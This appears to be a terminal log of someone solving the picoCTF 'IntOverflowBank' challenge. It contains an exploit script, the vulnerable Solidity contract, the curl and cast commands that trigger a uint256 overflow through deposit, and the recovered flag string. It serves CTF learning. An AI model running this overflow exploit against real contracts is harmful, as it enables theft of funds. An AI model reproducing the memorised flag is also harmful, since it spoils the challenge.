@@ -1,0 +1,120 @@
+
+ cat exploit.sh                                                                                                                                        ✔ 
+#!/bin/bash
+
+RPC_URL="http://mysterious-sea.picoctf.net:50818"
+CONTRACT="0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9"
+PRIV_KEY="0x333aea7dffdb01abfad883d90c508032cfc87014153f9c19a4313b8bf2facf28"
+
+echo "[1] Fazendo deposit com valor que causa overflow..."
+# We pass --gas-limit and --legacy to force cast to use simpler JSON payloads
+cast send $CONTRACT "deposit(uint256)" 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff \
+  --rpc-url $RPC_URL \
+  --private-key $PRIV_KEY \
+  --gas-limit 100000 \
+  --legacy
+
+echo "[2] Verificando se revealed = true..."
+cast call $CONTRACT "revealed()(bool)" --rpc-url $RPC_URL
+
+echo "[3] Pegando a flag!"
+cast call $CONTRACT "getFlag()(string)" --rpc-url $RPC_URL
+                                                                                                                                                                            
+
+      ~/Work  cat IntOverflowBank.sol                                                                                                                               ✔ 
+pragma solidity ^0.6.12;
+
+contract IntOverflowBank {
+    mapping(address => uint256) public balances;
+    address public owner;
+    string private flag;
+    bool public revealed;
+
+    event Deposit(address indexed who, uint256 amount);
+    event Withdraw(address indexed who, uint256 amount);
+    event FlagRevealed(string flag);
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "Only owner");
+        _;
+    }
+
+    constructor() public {
+        owner = msg.sender;
+        revealed = false;
+    }
+
+    function setFlag(string memory _flag) external onlyOwner {
+        flag = _flag;
+    }
+
+    function deposit(uint256 amount) external {
+        uint256 oldBalance = balances[msg.sender];
+        balances[msg.sender] = balances[msg.sender] + amount;
+
+        emit Deposit(msg.sender, amount);
+        if (!revealed && balances[msg.sender] < amount) {
+            revealed = true;
+            emit FlagRevealed(flag);
+        }
+    }
+
+    function withdraw(uint256 amount) external {
+        require(balances[msg.sender] >= amount, "Insufficient balance");
+        balances[msg.sender] = balances[msg.sender] - amount;
+        emit Withdraw(msg.sender, amount);
+    }
+
+    function getFlag() external view returns (string memory) {
+        require(revealed, "Flag not revealed yet");
+        return flag;
+    }
+}    
+
+     ~/Work  curl -X POST http://mysterious-sea.picoctf.net:50818 \                                                                                     1 ✘  4s   
+  -H "Content-Type: application/json" \
+  --data '{"jsonrpc":"2.0","method":"eth_call","params":[{"to":"0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9","data":"0x51830227"},"latest"],"id":1}'
+{"jsonrpc":"2.0","id":1,"result":"0x0000000000000000000000000000000000000000000000000000000000000000"}                                                                                                                                                                           
+
+      ~/Work  curl -X POST http://mysterious-sea.picoctf.net:50818 \                                                                                               ✔ 
+  -H "Content-Type: application/json" \
+  --data '{"jsonrpc":"2.0","method":"eth_call","params":[{"to":"0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9","data":"0xf9633930"},"latest"],"id":1}'
+{"jsonrpc":"2.0","id":1,"error":{"code":-32603,"message":"Error: VM Exception while processing transaction: reverted with reason string 'Flag not revealed yet'","data":{"message":"Error: VM Exception while processing transaction: reverted with reason string 'Flag not revealed yet'","data":"0x08c379a000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000015466c6167206e6f742072657665616c6564207965740000000000000000000000"}}}                                                                                                                                                                           
+
+      ~/Work  cast send 0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9 "deposit(uint256)" 1 \                                                                          ✔ 
+  --rpc-url http://mysterious-sea.picoctf.net:50818 \
+  --private-key 0x333aea7dffdb01abfad883d90c508032cfc87014153f9c19a4313b8bf2facf28 \
+  --gas-limit 100000 \
+  --legacy
+
+blockHash            0xe91d03009b648926eeb9ce50cda43f904dfb3913af6092a275c476f139ae8abe
+blockNumber          5
+contractAddress      
+cumulativeGasUsed    54664
+effectiveGasPrice    1514810065
+from                 0x3c4115aB13B0D7EaaA481E295804a2D49dDCBB8D
+gasUsed              54664
+logs                 [{"address":"0x6d8da4b12d658a36909ec1c75f81e54b8db4ebf9","topics":["0xe1fffcc4923d04b559f4d29a8bfc6cda04eb5b0d3c460751c2402c5c5cc9109c","0x0000000000000000000000003c4115ab13b0d7eaaa481e295804a2d49ddcbb8d"],"data":"0x0000000000000000000000000000000000000000000000000000000000000001","blockHash":"0xe91d03009b648926eeb9ce50cda43f904dfb3913af6092a275c476f139ae8abe","blockNumber":"0x5","transactionHash":"0x81a722da5dba2dbfdb2d978bce907359e6d701bc683b3be4a0c775d098f7a108","transactionIndex":"0x0","logIndex":"0x0","removed":false},{"address":"0x6d8da4b12d658a36909ec1c75f81e54b8db4ebf9","topics":["0x54ce18422826b91b0f2b424bfb268e46220b670bbc6f2f55f97f810c91ef45a4"],"data":"0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000277069636f4354467b536d3472375f4f766572464c3077735f45784935745f32386539363935327d00000000000000000000000000000000000000000000000000","blockHash":"0xe91d03009b648926eeb9ce50cda43f904dfb3913af6092a275c476f139ae8abe","blockNumber":"0x5","transactionHash":"0x81a722da5dba2dbfdb2d978bce907359e6d701bc683b3be4a0c775d098f7a108","transactionIndex":"0x0","logIndex":"0x1","removed":false}]
+logsBloom            0x00000000000000000000000000000800001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000400000000080000000000000080000000000000000000000008000400000000000000000000000000000000000000000000000000000000000004000100000000000001000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000400000000000000000
+root                 
+status               1 (success)
+transactionHash      0x81a722da5dba2dbfdb2d978bce907359e6d701bc683b3be4a0c775d098f7a108
+transactionIndex     0
+type                 0
+blobGasPrice         
+blobGasUsed          
+to                   0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9
+                                                                                                                                                                           
+
+      ~/Work  curl -X POST http://mysterious-sea.picoctf.net:50818 \                                                                                               ✔ 
+  -H "Content-Type: application/json" \
+  --data '{"jsonrpc":"2.0","method":"eth_call","params":[{"to":"0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9","data":"0x51830227"},"latest"],"id":1}'
+{"jsonrpc":"2.0","id":1,"result":"0x0000000000000000000000000000000000000000000000000000000000000001"}                                                                                                                                                                           
+
+      ~/Work  curl -X POST http://mysterious-sea.picoctf.net:50818 \                                                                                               ✔ 
+  -H "Content-Type: application/json" \
+  --data '{"jsonrpc":"2.0","method":"eth_call","params":[{"to":"0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9","data":"0xf9633930"},"latest"],"id":1}'
+{"jsonrpc":"2.0","id":1,"result":"0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000277069636f4354467b536d3472375f4f766572464c3077735f45784935745f32386539363935327d00000000000000000000000000000000000000000000000000"}                                                                                                                                                                           
+
+      ~/Work  cast abi-decode "getFlag()(string)" 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000277069636f4354467b536d3472375f4f766572464c3077735f45784935745f32386539363935327d00000000000000000000000000000000000000000000000000
+"picoCTF{Sm4r7_OverFL0ws_ExI5t_28e96952}"
